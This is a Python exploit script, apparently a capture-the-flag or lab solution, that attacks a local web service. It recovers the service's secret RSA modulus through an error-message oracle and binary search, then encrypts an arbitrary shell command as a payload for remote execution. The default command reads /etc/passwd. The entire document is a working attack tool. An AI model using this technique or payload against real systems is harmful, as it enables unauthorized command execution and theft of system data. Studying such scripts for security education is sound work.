from base64 import urlsafe_b64encode as b64enc
from base64 import urlsafe_b64decode as b64dec
from Crypto.Util.number import long_to_bytes as l2b
from Crypto.Util.number import bytes_to_long as b2l
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import requests
import re
import sys


def check(n):
    sys.stdout.write('\rMODULUS: {:x} '.format(n))
    resp = requests.get('http://127.0.0.1:5000/?cmd={}'.format(b64enc(l2b(n)).decode()))
    if 'Ciphertext too large' in resp.text:
        return True
    if 'Ciphertext with incorrect length' in resp.text:
        return True
    return False


def binary_search(inf, sup):
    med = (inf + sup) // 2
    if check(med):
        if (sup - inf) <= 2:
            return med
        return binary_search(inf, med)
    else:
        if(sup - inf) <= 2:
            return sup
        return binary_search(med, sup)


resp = requests.get('http://127.0.0.1:5000/')
matchs = re.findall('value="([^"]+)" name="cmd"', resp.text)

inf = b2l(b64dec(matchs[0]))
sup = 2*inf
while not check(sup):
    inf = sup
    sup = 2*inf

e = 0x10001
n = binary_search(inf, sup)
sys.stdout.write('\rMODULUS: {:x} \n'.format(n))

pubkey = RSA.construct((n, e))
print(pubkey.export_key().decode())

command = b'cat /etc/passwd'
if len(sys.argv) > 1:
    command = sys.argv[1].encode()
cipher = PKCS1_OAEP.new(pubkey)
payload = b64enc(cipher.encrypt(command)).decode()
print('PAYLOAD: {}'.format(payload))
